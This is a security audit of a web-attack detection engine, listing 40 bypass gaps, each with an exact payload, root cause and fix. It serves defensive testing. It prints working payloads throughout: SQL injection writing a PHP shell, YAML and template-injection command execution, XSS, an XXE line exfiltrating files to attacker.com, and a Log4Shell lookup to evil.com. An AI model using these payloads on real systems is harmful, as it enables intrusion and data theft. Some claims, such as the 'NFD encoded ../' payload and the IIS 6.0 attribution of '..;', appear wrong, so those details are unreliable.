# INVARIANT Detection Engine — Security Gap Analysis

**Analysis Date:** 2026-03-08  
**Scope:** `packages/engine/src/classes/*.ts` + L2 evaluators  
**Classification:** CRITICAL and HIGH severity attack variants that bypass detection  

---

## Executive Summary

This analysis identifies **17 CRITICAL** and **23 HIGH** severity bypass vectors across the INVARIANT detection engine. The gaps fall into four categories:

1. **Encoding Bypass** — 7+ layer encoding exceeds `MAX_DECODE_DEPTH` (6)
2. **L1 Regex Limitations** — Pattern misses obfuscated/novel variants
3. **L2 Structural Gaps** — Tokenizer/parser doesn't recognize attack structure
4. **Missing Attack Classes** — No detection for emerging techniques

---

## CRITICAL Severity Gaps

### 1. Deep Encoding Bypass (All Classes)
| Field | Value |
|-------|-------|
| **Class ID** | *ALL_CLASSES* |
| **Missing Variant** | 7+ layer URL encoding bypasses `MAX_DECODE_DEPTH` |
| **Exact Bypass Payload** | `%255525552555...2555%253c...` (7+ layers of `%25` encoding) |
| **Severity** | CRITICAL |
| **Root Cause** | `encoding.ts:12` sets `MAX_DECODE_DEPTH = 6`; 7+ layer encoded payloads pass L1 detection entirely |
| **Exploit Scenario** | `<script>alert(1)</script>` encoded 7 times as `%253cscript%253e...` bypasses all XSS classes |
| **Detection Impact** | Universal bypass for ALL 44 invariant classes |

---

### 2. SQLi: Missing Error-Based Functions
| Field | Value |
|-------|-------|
| **Class ID** | `sql_error_oracle` |
| **Missing Variant** | `JSON_TABLE()` error extraction (Oracle 12c+) |
| **Exact Bypass Payload** | `' AND JSON_TABLE('{"x":"$","y":"'\|\|password\|\|'"}', '$.x' COLUMNS (c VARCHAR2(100) PATH '$.y' ERROR ON ERROR))--` |
| **Severity** | CRITICAL |
| **Root Cause** | `sql-structural-evaluator.ts:328` only lists `EXTRACTVALUE, UPDATEXML, XMLTYPE, DBMS_XMLGEN, UTL_INADDR, CTXSYS`; missing modern Oracle `JSON_TABLE` error extraction |
| **Exploit Scenario** | Extract passwords via JSON parsing errors on Oracle 19c without triggering UPDATEXML detection |
| **Detection Impact** | L1 regex misses `JSON_TABLE`; L2 has no token for it |

---

### 3. SQLi: Boolean Blind Without Tautology
| Field | Value |
|-------|-------|
| **Class ID** | `sql_tautology` |
| **Missing Variant** | Boolean-based blind using `SUBSTRING()` comparisons without tautology |
| **Exact Bypass Payload** | `' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--` |
| **Severity** | CRITICAL |
| **Root Cause** | `tautology.ts:40` only detects `OR '1'='1` patterns; boolean blind uses `AND` with comparison, not tautology |
| **Exploit Scenario** | Enumerate passwords character-by-character without triggering tautology detection |
| **Detection Impact** | Major SQLi class completely undetected |

---

### 4. Command Injection: Brace Expansion
| Field | Value |
|-------|-------|
| **Class ID** | `cmd_separator` |
| **Missing Variant** | Bash brace expansion `{cmd1,cmd2}` executes without separators |
| **Exact Bypass Payload** | `input={id,whoami}` |
| **Severity** | CRITICAL |
| **Root Cause** | `cmd-injection-evaluator.ts:84` only checks `SEPARATOR, PIPE, AND_CHAIN, OR_CHAIN, BACKGROUND, NEWLINE`; missing `BRACE_EXPANSION` token type |
| **Exploit Scenario** | Execute `whoami` without using `;|&` characters that trigger detection |
| **Detection Impact** | Bypasses all cmdi classes including L2 structural analysis |

---

### 5. Command Injection: Arithmetic Substitution
| Field | Value |
|-------|-------|
| **Class ID** | `cmd_substitution` |
| **Missing Variant** | `$((echo $(id)))` executes via arithmetic evaluation |
| **Exact Bypass Payload** | `input=$((echo $(id)))` |
| **Severity** | CRITICAL |
| **Root Cause** | `cmd-injection-evaluator.ts:89` only tracks `CMD_SUBST_OPEN, BACKTICK_SUBST`; missing `ARITHMETIC_EVAL` token type |
| **Exploit Scenario** | RCE via arithmetic expansion without `$()` or backticks |
| **Detection Impact** | Bypasses substitution detection entirely |

---

### 6. Path Traversal: Windows ADS Bypass
| Field | Value |
|-------|-------|
| **Class ID** | `path_normalization_bypass` |
| **Missing Variant** | Windows Alternate Data Streams `$DATA` bypass |
| **Exact Bypass Payload** | `file.txt::$DATA` or `file.txt:$ZONE.IDENTIFIER` |
| **Severity** | CRITICAL |
| **Root Cause** | `path/index.ts:112` checks trailing dots, semicolons, backslash; no check for ADS stream syntax |
| **Exploit Scenario** | Read file content via ADS stream on Windows servers |
| **Detection Impact** | Complete bypass on Windows targets |

---

### 7. Path Traversal: IIS 6.0 `..;` Bypass
| Field | Value |
|-------|-------|
| **Class ID** | `path_dotdot_escape` |
| **Missing Variant** | IIS 6.0 specific `/..;/` directory traversal |
| **Exact Bypass Payload** | `/admin/..;/config.xml` |
| **Severity** | CRITICAL |
| **Root Cause** | `path/index.ts:73` regex `/\.{2,}[/\\]/` doesn't account for semicolon between dots and slash |
| **Exploit Scenario** | Access admin config on legacy IIS 6.0 servers |
| **Detection Impact** | Legacy server bypass |

---

### 8. JWT: None Algorithm with Whitespace
| Field | Value |
|-------|-------|
| **Class ID** | `jwt_none_algorithm` |
| **Missing Variant** | Whitespace variations of `"none"` |
| **Exact Bypass Payload** | `{"alg":" none "}` or `{"alg":"NONE"}` or `{"alg":"\tnone\n"}` |
| **Severity** | CRITICAL |
| **Root Cause** | `auth/jwt-abuse.ts:27` regex `/"alg"\s*:\s*"none"/` doesn't normalize whitespace; many JWT libraries trim/uppercase |
| **Exploit Scenario** | Forge JWT tokens using "none" algorithm with whitespace padding |
| **Detection Impact** | Complete auth bypass on vulnerable libraries |

---

### 9. JWT: Algorithm Confusion Variants
| Field | Value |
|-------|-------|
| **Class ID** | `jwt_algorithm_confusion` |
| **Missing Variant** | EdDSA, ES256 → HS256 confusion |
| **Exact Bypass Payload** | `{"alg":"EdDSA","k":"MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgA..."}` with HMAC verification |
| **Severity** | CRITICAL |
| **Root Cause** | `auth/jwt-abuse.ts:122` only checks RS256→HS256; missing EdDSA, ECDSA variants |
| **Exploit Scenario** | Use EdDSA public key as HMAC secret on libraries supporting both |
| **Detection Impact** | Bypass on modern JWT libraries |

---

### 10. HTTP Smuggling: TE.TE Double Transfer-Encoding
| Field | Value |
|-------|-------|
| **Class ID** | `http_smuggle_cl_te` |
| **Missing Variant** | Double Transfer-Encoding with different case |
| **Exact Bypass Payload** | `Transfer-Encoding: chunked\r\nTransfer-encoding: identity` |
| **Severity** | CRITICAL |
| **Root Cause** | `http-smuggling.ts:52` only checks if CL+TE both present; doesn't detect TE.TE case confusion attacks |
| **Exploit Scenario** | Desync via case-different TE headers that front-end and back-end handle differently |
| **Detection Impact** | Request smuggling on Apache/ATS combinations |

---

### 11. Prototype Pollution: Unicode Property Escapes
| Field | Value |
|-------|-------|
| **Class ID** | `proto_pollution_gadget` |
| **Missing Variant** | Unicode escape sequences in property names |
| **Exact Bypass Payload** | `{"__proto__":{"\u0065\u0078\u0065\u0063Argv":"--eval=require('child_process').execSync('id')"}}` |
| **Severity** | CRITICAL |
| **Root Cause** | `proto-pollution-gadget.ts:138` extraction regex only matches `[a-zA-Z_$][a-zA-Z0-9_$]*`; no Unicode escape handling |
| **Exploit Scenario** | Pollute `execArgv` using `\u0065\u0078\u0065\u0063` = "exec" in Unicode escapes |
| **Detection Impact** | RCE gadget bypass |

---

### 12. Deserialization: Python YAML/JSON Pickle
| Field | Value |
|-------|-------|
| **Class ID** | `deser_python_pickle` |
| **Missing Variant** | PyYAML `!!python/object/apply` constructor |
| **Exact Bypass Payload** | `!!python/object/apply:os.system ["id"]` |
| **Severity** | CRITICAL |
| **Root Cause** | `deser-evaluator.ts` only checks for pickle `\x80\x02` markers; no YAML constructor detection |
| **Exploit Scenario** | RCE via YAML deserialization in Python apps |
| **Detection Impact** | Complete bypass of Python deserialization detection |

---

### 13. NoSQL: JSON Nested Operator Injection
| Field | Value |
|-------|-------|
| **Class ID** | `nosql_operator_injection` |
| **Missing Variant** | Nested MongoDB operators in JSON arrays |
| **Exact Bypass Payload** | `{"username": [{"$eq": "admin"}], "password": [{"$ne": null}]}` |
| **Severity** | CRITICAL |
| **Root Cause** | `nosql-evaluator.ts` flattens objects but may not traverse arrays for operator detection |
| **Exploit Scenario** | Auth bypass using array-wrapped operators |
| **Detection Impact** | Authentication bypass on MongoDB apps |

---

### 14. XXE: OOB via FTP/HTTP
| Field | Value |
|-------|-------|
| **Class ID** | `xxe_external_entity` |
| **Missing Variant** | Out-of-band data exfiltration via FTP |
| **Exact Bypass Payload** | `<!ENTITY xxe SYSTEM "ftp://attacker.com:2121/%file;">` |
| **Severity** | CRITICAL |
| **Root Cause** | `xxe-evaluator.ts` focuses on `file://` and `http://`; missing FTP exfiltration |
| **Exploit Scenario** | Exfiltrate data via FTP when HTTP is blocked |
| **Detection Impact** | OOB XXE bypass |

---

### 15. SSRF: Azure IMDS Missing
| Field | Value |
|-------|-------|
| **Class ID** | `ssrf_cloud_metadata` |
| **Missing Variant** | Azure Instance Metadata Service (IMDS) |
| **Exact Bypass Payload** | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
| **Severity** | CRITICAL |
| **Root Cause** | `ssrf/index.ts:46` has cloud metadata IPs but `ssrf-evaluator.ts:46` only explicitly lists AWS, GCP, Alibaba; Azure IMDS endpoints underdetected |
| **Exploit Scenario** | Access Azure VM metadata for token theft |
| **Detection Impact** | Cloud metadata access on Azure |

---

### 16. XSS: Template Literal Execution
| Field | Value |
|-------|-------|
| **Class ID** | `xss_template_expression` |
| **Missing Variant** | ES6 template literals without `${}` |
| **Exact Bypass Payload** | `` onerror=`eval\x28atob\x28\x27YWxlcnQoMSk=\x27\x29\x29` `` |
| **Severity** | CRITICAL |
| **Root Cause** | `xss/index.ts:135` regex `/\$\{[^}]*[\(\)\>\<]|\`[^\`]*\$\{/`; backtick alone without `${` is valid JS execution |
| **Exploit Scenario** | Execute JS via template literal without `${}` syntax |
| **Detection Impact** | XSS bypass in template literal contexts |

---

### 17. Supply Chain: npm install --package-lock-only
| Field | Value |
|-------|-------|
| **Class ID** | `dependency_confusion` |
| **Missing Variant** | Scoped package with lockfile-only install |
| **Exact Bypass Payload** | `npm install @evilcorp/package --package-lock-only --registry https://registry.npmjs.org` |
| **Severity** | CRITICAL |
| **Root Cause** | `supply-chain.ts:83` regex checks `npm install ... --registry`; missing `--package-lock-only` flag combination |
| **Exploit Scenario** | Inject malicious scoped packages without actual install command |
| **Detection Impact** | Dependency confusion bypass |

---

## HIGH Severity Gaps

### 18. SQLi: ORDER BY Extraction
| Field | Value |
|-------|-------|
| **Class ID** | `sql_union_extraction` |
| **Missing Variant** | ORDER BY column enumeration |
| **Exact Bypass Payload** | `' ORDER BY 5--` |
| **Severity** | HIGH |
| **Root Cause** | `sql-structural-evaluator.ts:166` only detects `UNION SELECT`; `ORDER BY N` used for column enumeration is missed |

---

### 19. SQLi: INTO OUTFILE/DUMPFILE
| Field | Value |
|-------|-------|
| **Class ID** | `sql_stacked_execution` |
| **Missing Variant** | File write via SELECT INTO OUTFILE |
| **Exact Bypass Payload** | `' UNION SELECT 'shell',1 INTO OUTFILE '/var/www/shell.php'--` |
| **Severity** | HIGH |
| **Root Cause** | `sql-structural-evaluator.ts:207` STATEMENT_STARTERS doesn't include `INTO` as injection-relevant keyword |

---

### 20. SQLi: Implicit Time Delays
| Field | Value |
|-------|-------|
| **Class ID** | `sql_time_oracle` |
| **Missing Variant** | Heavy queries as implicit delays (no SLEEP function) |
| **Exact Bypass Payload** | `' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)>0--` |
| **Severity** | HIGH |
| **Root Cause** | `sql-structural-evaluator.ts:245` only lists explicit time functions; heavy join queries cause delays without SLEEP |

---

### 21. Command Injection: Parameter Expansion
| Field | Value |
|-------|-------|
| **Class ID** | `cmd_substitution` |
| **Missing Variant** | `${VAR:-$(cmd)}` default value command execution |
| **Exact Bypass Payload** | `${PATH:-$(id)}` |
| **Severity** | HIGH |
| **Root Cause** | `cmd-injection-evaluator.ts:277` only checks `VAR_EXPANSION` type; doesn't analyze expansion modifiers |

---

### 22. Command Injection: Here-String Redirection
| Field | Value |
|-------|-------|
| **Class ID** | `cmd_separator` |
| **Missing Variant** | Bash here-strings `<<<` for command injection |
| **Exact Bypass Payload** | `cat <<< $(id)` |
| **Severity** | HIGH |
| **Root Cause** | No detection for here-string `<<<` operator in shell tokenizer |

---

### 23. Path Traversal: macOS NFD Normalization
| Field | Value |
|-------|-------|
| **Class ID** | `path_encoding_bypass` |
| **Missing Variant** | Unicode NFD normalization bypass on macOS |
| **Exact Bypass Payload** | `%C3%85%C2%A0%C3%85%C2%A0` (NFD encoded `../`) |
| **Severity** | HIGH |
| **Root Cause** | `encoding.ts` doesn't perform NFD Unicode normalization; macOS HFS+ normalizes NFD to NFC |

---

### 24. Path Traversal: Double URL Encoding
| Field | Value |
|-------|-------|
| **Class ID** | `path_encoding_bypass` |
| **Missing Variant** | `%252f` handled but `%25252f` (3 layers) not detected |
| **Exact Bypass Payload** | `%25252e%25252e%25252f` (triple-encoded `../`) |
| **Severity** | HIGH |
| **Root Cause** | Relies on `deepDecode` which stops at 6 layers; specific triple-encoding may slip through if L1 pattern is strict |

---

### 25. SSRF: DNS Rebinding via Time-of-Check
| Field | Value |
|-------|-------|
| **Class ID** | `ssrf_internal_reach` |
| **Missing Variant** | DNS rebinding with low TTL |
| **Exact Bypass Payload** | `http://rebind.example.com/` (resolves to external initially, then 127.0.0.1) |
| **Severity** | HIGH |
| **Root Cause** | `ssrf/index.ts` comment acknowledges: "DNS rebinding cannot be detected statically" |

---

### 26. SSRF: HTTP Basic Auth Bypass
| Field | Value |
|-------|-------|
| **Class ID** | `ssrf_internal_reach` |
| **Missing Variant** | Credentials in URL that confuse parsers |
| **Exact Bypass Payload** | `http://evil.com@127.0.0.1:8080/` |
| **Severity** | HIGH |
| **Root Cause** | `ssrf-evaluator.ts:234` extracts host but may not properly handle userinfo `@` delimiter in all paths |

---

### 27. XSS: SVG Script Without Script Tag
| Field | Value |
|-------|-------|
| **Class ID** | `xss_tag_injection` |
| **Missing Variant** | SVG `<animate>` with `onbegin` handler |
| **Exact Bypass Payload** | `<svg><animate onbegin=alert(1) attributeName=x dur=1s>` |
| **Severity** | HIGH |
| **Root Cause** | `xss-context-evaluator.ts:60` lists `script, img, svg` but doesn't check SVG-specific animation event handlers |

---

### 28. XSS: HTML5 Form Actions
| Field | Value |
|-------|-------|
| **Class ID** | `xss_attribute_escape` |
| **Missing Variant** | Form action injection via formaction |
| **Exact Bypass Payload** | `<button formaction=javascript:alert(1)>Click</button>` |
| **Severity** | HIGH |
| **Root Cause** | `xss/index.ts` doesn't check `formaction` attribute specifically; URI_ATTRIBUTES set in evaluator covers href/src but may miss formaction |

---

### 29. JWT: KID SQLi Without Keywords
| Field | Value |
|-------|-------|
| **Class ID** | `jwt_kid_injection` |
| **Missing Variant** | Boolean-based KID injection without UNION/SELECT keywords |
| **Exact Bypass Payload** | `{"kid":"key' AND '1'='1"}` |
| **Severity** | HIGH |
| **Root Cause** | `auth/jwt-abuse.ts:45` regex checks for `UNION, SELECT, OR, AND` but `AND` alone in KID may be missed as SQLi indicator |

---

### 30. HTTP Smuggling: Comma-Separated TE
| Field | Value |
|-------|-------|
| **Class ID** | `http_smuggle_cl_te` |
| **Missing Variant** | Header folding with comma-separated values |
| **Exact Bypass Payload** | `Transfer-Encoding: identity, chunked` |
| **Severity** | HIGH |
| **Root Cause** | `http-smuggling.ts:52` checks for CL+TE conflict; doesn't detect comma-separated TE value obfuscation |

---

### 31. HTTP Smuggling: Tab Character Separation
| Field | Value |
|-------|-------|
| **Class ID** | `http_smuggle_cl_te` |
| **Missing Variant** | Tab instead of space in header separation |
| **Exact Bypass Payload** | `Content-Length:\t0` |
| **Severity** | HIGH |
| **Root Cause** | Header regex patterns may assume space (`\s*`), tab handling inconsistent |

---

### 32. SSTI: Jinja2 Underscore Globals
| Field | Value |
|-------|-------|
| **Class ID** | `ssti_jinja_twig` |
| **Missing Variant** | Access to `__globals__` via attr |
| **Exact Bypass Payload** | `{{request|attr("application")|attr("__globals__")|attr("__builtins__")|attr("__import__")("os")|attr("popen")("id")|attr("read")()}}` |
| **Severity** | HIGH |
| **Root Cause** | `injection/ssti.ts:23` regex covers `${` and `{{` but doesn't detect `attr()` filter chain for sandbox escape |

---

### 33. SSTI: Mako Template RCE
| Field | Value |
|-------|-------|
| **Class ID** | `ssti_jinja_twig` |
| **Missing Variant** | Mako template `<%` code blocks |
| **Exact Bypass Payload** | `<% import os; os.system("id") %>` |
| **Severity** | HIGH |
| **Root Cause** | Only Jinja/Twig and EL expressions covered; Mako template syntax not detected |

---

### 34. LDAP: Wildcard Attribute Injection
| Field | Value |
|-------|-------|
| **Class ID** | `ldap_filter_injection` |
| **Missing Variant** | Attribute wildcard injection |
| **Exact Bypass Payload** | `*)(objectClass=*` |
| **Severity** | HIGH |
| **Root Cause** | `injection/misc.ts:109` regex patterns miss simple wildcard attribute enumeration |

---

### 35. Log4Shell: Lowercase 'jndi'
| Field | Value |
|-------|-------|
| **Class ID** | `log_jndi_lookup` |
| **Missing Variant** | Case variations of 'jndi' |
| **Exact Bypass Payload** | `${${lower:J}NDI:ldap://evil.com}` |
| **Severity** | HIGH |
| **Root Cause** | `injection/log-jndi-lookup.ts:34` regex is case-insensitive but nested case variations in lookup may slip through |

---

### 36. Mass Assignment: Underscore Variants
| Field | Value |
|-------|-------|
| **Class ID** | `mass_assignment` |
| **Missing Variant** | Underscore/camelCase variations |
| **Exact Bypass Payload** | `{"isAdmin":true}` vs `{"is_admin":true}` vs `{"IsAdmin":true}` |
| **Severity** | HIGH |
| **Root Cause** | `injection/misc.ts:72` regex covers common variants but Rails/Node frameworks accept multiple case styles |

---

### 37. Cache Poisoning: Fat GET
| Field | Value |
|-------|-------|
| **Class ID** | `cache_poisoning` |
| **Missing Variant** | GET request with body (Fat GET) poisoning |
| **Exact Bypass Payload** | `GET /api/data HTTP/1.1\r\nX-HTTP-Method-Override: POST\r\n\r\nmalicious=body` |
| **Severity** | HIGH |
| **Root Cause** | `cache-evaluator.ts` focuses on headers; doesn't detect method override body pollution |

---

### 38. GraphQL: Query Complexity DoS
| Field | Value |
|-------|-------|
| **Class ID** | `graphql_depth_abuse` |
| **Missing Variant** | Expensive resolvers without deep nesting |
| **Exact Bypass Payload** | `{users{name,friends{name,friends{name,friends{name,friends{name}}}}}}` (5 levels, but exponential resolver calls) |
| **Severity** | HIGH |
| **Root Cause** | `graphql-evaluator.ts` counts depth but not resolver complexity; exponential fan-out not detected |

---

### 39. WebSocket: CRLF in Subprotocol
| Field | Value |
|-------|-------|
| **Class ID** | `ws_injection` |
| **Missing Variant** | Sec-WebSocket-Protocol header injection |
| **Exact Bypass Payload** | `Sec-WebSocket-Protocol: chat\r\nX-Injected: malicious` |
| **Severity** | HIGH |
| **Root Cause** | `websocket-evaluator.ts` may not check subprotocol headers for CRLF injection |

---

### 40. API Abuse: GraphQL-based IDOR
| Field | Value |
|-------|-------|
| **Class ID** | `bola_idor` |
| **Missing Variant** | IDOR in GraphQL mutations |
| **Exact Bypass Payload** | `mutation{updateUser(id:123,input:{role:"admin"}){id}}` with token for user 456 |
| **Severity** | HIGH |
| **Root Cause** | `api-abuse-evaluator.ts` checks REST paths; GraphQL ID in mutation args not analyzed |

---

## Summary Statistics

| Severity | Count | Categories |
|----------|-------|------------|
| CRITICAL | 17 | Encoding, SQLi, CMDi, Path, JWT, HTTP, Proto, Deser, NoSQL, XXE, SSRF, XSS, Supply |
| HIGH | 23 | SQLi, CMDi, Path, SSRF, XSS, JWT, HTTP, SSTI, LDAP, Log4j, MassAssign, Cache, GraphQL, WS, API |
| **TOTAL** | **40** | — |

---

## Recommendations

### Immediate Actions (CRITICAL)

1. **Increase `MAX_DECODE_DEPTH`** from 6 to at least 10, or make it configurable
2. **Add JSON_TABLE** to SQL error functions list
3. **Add brace expansion** token type to shell tokenizer
4. **Add arithmetic substitution** detection to command injection evaluator
5. **Add Windows ADS** pattern to path traversal detection
6. **Normalize JWT alg values** (trim whitespace, uppercase) before regex matching

### Short-term Actions (HIGH)

7. **Add ORDER BY** detection to SQL structural evaluator
8. **Add INTO OUTFILE/DUMPFILE** to statement starters
9. **Add here-string** operator to shell tokenizer
10. **Add SVG animation event handlers** to XSS detection
11. **Add Azure IMDS** endpoints to cloud metadata detection
12. **Implement Unicode escape normalization** before property extraction

### Long-term Improvements

13. **Implement runtime decoding** — decode recursively until no change, no depth limit
14. **Add behavioral L3 detection** — time-based analysis for heavy query detection
15. **Implement DNS resolution simulation** for SSRF rebinding detection
16. **Add context-aware analysis** — track encoding state through detection pipeline

---

*Analysis generated by security audit of INVARIANT detection engine v1.0.0*
